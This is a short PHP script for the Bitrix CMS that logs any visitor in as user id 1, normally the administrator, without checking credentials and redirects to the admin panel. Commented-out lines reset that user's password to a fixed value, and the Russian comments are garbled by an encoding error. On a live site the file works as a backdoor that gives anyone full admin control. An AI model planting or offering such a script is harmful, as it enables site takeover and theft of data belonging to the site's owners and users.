<?
	require($_SERVER["DOCUMENT_ROOT"] . "/bitrix/header.php"); //���������� �����
global $USER; //�������� ���������� $USER
$USER->Authorize(1); //�������������� ����������� ��� id = 1(� ����� ������ �����)
LocalRedirect("/bitrix/admin/"); //��������� � ��������� ������
// require($_SERVER['DOCUMENT_ROOT']."/bitrix/header.php");
// echo $USER->Update(1,array("PASSWORD"=>'Bitrix*123456'));
// echo $USER->LAST_ERROR;
require($_SERVER['DOCUMENT_ROOT']."/bitrix/footer.php");
?>